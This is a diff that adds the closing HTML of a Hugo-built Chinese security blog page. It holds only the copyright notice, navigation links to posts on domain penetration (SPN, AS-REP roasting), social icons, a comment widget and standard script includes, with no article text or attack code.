+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">F0rmat</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2022-02-26
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/ad_spn/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">域渗透-SPN</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/ad_as_reproasting/">
+            <span class="next-text nav-default">域渗透-AS_REPRoasting</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="https://github.com/Secd0g/" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://www.zhihu.com/people/F0rmat" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://xxe.icu/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2017 -
+    2022
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        F0rmat
+        
+      </span></span>
+
+  
+  
+    <span id="busuanzi_container">
+      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
